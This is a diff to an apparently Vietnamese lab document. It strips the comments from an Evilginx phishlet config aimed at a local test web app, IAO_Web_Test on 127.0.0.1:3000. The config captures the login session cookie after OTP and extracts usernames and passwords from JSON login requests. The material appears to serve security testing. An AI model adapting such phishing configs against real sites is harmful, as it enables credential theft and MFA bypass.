@@ -168,17 +168,14 @@ Tệp YAML cấu hình cho Evilginx khi attack vào [IAO_Web_Test](./IAO_Web_Tes
 ```yaml
 min_ver: '3.0.0'
 proxy_hosts:
-  # Cấu hình proxy trỏ về ứng dụng web mục tiêu
   - {phish_sub: 'login', orig_sub: '', domain: '127.0.0.1:3000', session: true, is_landing: true, auto_filter: true}
 
 sub_filters: []
 
-# Cookie phiên cần lấy sau khi người dùng nhập đúng OTP
 auth_tokens:
   - domain: '127.0.0.1'
     keys: ['sid']
 
-# Bóc tách tên đăng nhập và mật khẩu từ body JSON
 credentials:
   username:
     key: 'identifier'
@@ -189,7 +186,6 @@ credentials:
     search: '"password"\s*:\s*"([^"]+)"'
     type: 'json'
 
-# Đường dẫn trang đăng nhập
 login:
   domain: '127.0.0.1:3000'
   path: '/login'
